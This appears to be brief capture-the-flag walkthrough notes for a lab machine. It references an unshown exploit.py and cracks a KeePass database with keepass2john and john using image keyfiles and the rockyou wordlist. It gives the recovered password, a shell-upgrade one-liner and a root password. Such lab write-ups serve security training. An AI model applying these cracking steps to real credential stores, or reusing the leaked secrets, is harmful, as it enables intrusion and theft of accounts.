```
refer to nmap, Check the source code: http://10.10.10.147/myapp (binary)

shellcode:


run exploit.py you will get the shell

in home you will get MyPassword.kdbx file, you need to crack it, read this article
https://www.rubydevices.com.au/blog/how-to-hack-keepass

go to home there you will get the Image files download them and run
keepass2john -k IMG_0545.JPG MyPassword.kdbx > 45.hash
keepass2john -k IMG_0546.JPG MyPassword.kdbx > 46.hash
keepass2john -k IMG_0547.JPG MyPassword.kdbx > 47.hash
keepass2john -k IMG_0548.JPG MyPassword.kdbx > 48.hash
keepass2john -k IMG_0552.JPG MyPassword.kdbx > 52.hash
keepass2john -k IMG_0553.JPG MyPassword.kdbx > 53.hash
cat 45.hash 46.hash 47.hash 48.hash 52.hash 53.hash > all.hash

john --wordlist=/usr/share/wordlists/rockyou.txt all.hash

bullshit  47.hash


another way to upgrade shell.

/usr/bin/script -qc /bin/bash /dev/null


use keepassx to open the file we need keyfile IMG0547.JPG and password bullshit.

u3v2249dl9ptv465cogl3cnpo3fyhk (root password)

run exploit.py
upgrade shell 
su root
enter the password (be happy).
you will get the root flag.




 
```
